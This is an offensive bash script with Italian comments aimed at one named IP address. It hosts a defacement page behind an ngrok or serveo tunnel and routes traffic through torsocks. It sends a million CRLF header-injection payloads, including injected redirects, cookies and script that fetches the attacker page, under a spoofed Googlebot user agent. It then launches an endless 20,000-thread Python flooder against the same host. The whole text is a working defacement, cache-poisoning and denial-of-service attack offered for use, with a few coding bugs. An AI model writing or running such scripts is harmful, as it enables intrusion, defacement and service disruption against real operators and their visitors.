#!/bin/bash
# AINTREE_ROOT_CRLF.sh - 216.46.129.171 DEFACE DIRECT
# Path reflection nel 301 redirect → ROOT DEFACE

HTML_FILE="TRUSTEDF57.html"

echo "💀 AINTREE PARK ROOT CRLF - 216.46.129.171"
echo "[+] HTML: $HTML_FILE"

# VERIFICA HTML
[ -f "$HTML_FILE" ] || { echo "❌ Crea $HTML_FILE con deface HTML"; exit 1; }
echo "[+] OK: $(stat -c %s $HTML_FILE) bytes"

# CLEANUP
pkill -f http.server >/dev/null 2>&1 || true
pkill -f ngrok >/dev/null 2>&1 || true
pkill -f ssh.*serveo >/dev/null 2>&1 || true
sleep 2

TORSOCKS="torsocks"
safe_curl() { $TORSOCKS curl -s -m 5 -k "$@"; }

# 1. PYTHON SERVER
echo "[+] Server localhost:8080"
nohup python3 -m http.server 8080 --bind 127.0.0.1 > /dev/null 2>&1 &
SERVER_PID=$!
sleep 6

# 2. TUNNEL
echo "[+] Tunnel ngrok/serveo"
if command -v ngrok >/dev/null; then
    nohup ngrok http 8080 > ngrok.log 2>&1 &
    sleep 10
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
else
    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
    sleep 15
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.serveo\.net' serveo.log | head -1)
fi

DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
echo "🔗 DEFACE URL: $DEFACE_URL"
safe_curl "$DEFACE_URL" | head -1 || echo "❌ Tunnel fail - check logs"

# 3. AINTREE CRLF - PATH REFLECTION dal tuo "../etc/passwd" hit
AINTREE_IP="216.46.129.171"
echo "[+] CRLF POISON su $AINTREE_IP - 1M SHOTS"

# Payloads specifici dal tuo test (redirect riflette path)
crlf_payloads=(
    "%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html"
    "%0d%0aSet-Cookie:%20pwned=1;%20Location:%20$DEFACE_URL"
    "%0d%0a<html><h1>ROOT_PWNED</h1><script>fetch('$DEFACE_URL')</script>"
    "%0d%0aLocation:%20javascript:fetch('$DEFACE_URL')"
)

for payload in "${crlf_payloads[@]}"; do
    for i in $(seq 1 250000); do
        safe_curl "http://$AINTREE_IP/" \
            --data-urlencode "path=../$payload" \
            -H "User-Agent: Googlebot/2.1" \
            -H "Referer: $DEFACE_URL" \
            >/dev/null 2>&1 &
        
        [ $((i % 10000)) -eq 0 ] && echo "[+] $i shots - $(date)"
    done
    wait
done

echo "✅ 1M+ CRLF SHOTS COMPLETE!"

# 4. INFINITE PYTHON FLOODER
cat > aintree_flood.py << 'EOF'
#!/usr/bin/env python3
import requests, threading, urllib.parse, sys, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

deface = sys.argv[1]
target_ip = "216.46.129.171"

def crlf_poison():
    s = requests.Session()
    payloads = [
        f"\r\nLocation: {deface}\r\nContent-Type: text/html",
        f"\r\nSet-Cookie: pwned=1;Location: {deface}",
        f"\r\n<html><title>PWNED</title><script>location='{deface}'</script>"
    ]
    while True:
        try:
            for p in payloads:
                s.get(f"http://{target_ip}/", params={'q': urllib.parse.quote(p)}, 
                      headers={'User-Agent': 'Googlebot'}, verify=False, timeout=3)
        except: pass

print("AINTREE ROOT FLOOD - 20K threads")
threads = []
for _ in range(20000):
    t = threading.Thread(target=crlf_poison, daemon=True)
    t.start()
    threads.append(t)

while True:
    time.sleep(60)
    print(f"Active threads: {len(threading.active_count())}")
EOF

chmod +x aintree_flood.py
echo "[+] 20K threads infiniti"
nohup ./aintree_flood.py "$DEFACE_URL" > flood.log 2>&1 &
FLOOD_PID=$!

# 5. TEST SCRIPT
cat > test_aintree.sh << EOF
#!/bin/bash
echo "=== AINTREE ROOT TEST ==="
echo "\$(date)"
safe_curl "http://$AINTREE_IP/" --data "test=1" | grep -iE "Location|$DEFACE_URL|301" || echo "No reflection yet..."
safe_curl -k "https://$AINTREE_IP/" | grep -i "pwned\|$DEFACE_URL" || echo "Clean"
safe_curl "$DEFACE_URL" | head -1
EOF

chmod +x test_aintree.sh
echo "./test_aintree.sh  # Monitor"

echo "🔥 PIDS: Server=$SERVER_PID | Tunnel=$TUNNEL_PID | Flood=$FLOOD_PID"
echo "💀 AINTREE CRLF POISON RUNNING - Check cache/CDN 10-60min"
echo "tail -f flood.log  # Logs"

# INFINITE LOOP
while true; do sleep 120; echo "$(date) - ATTACK ALIVE"; done
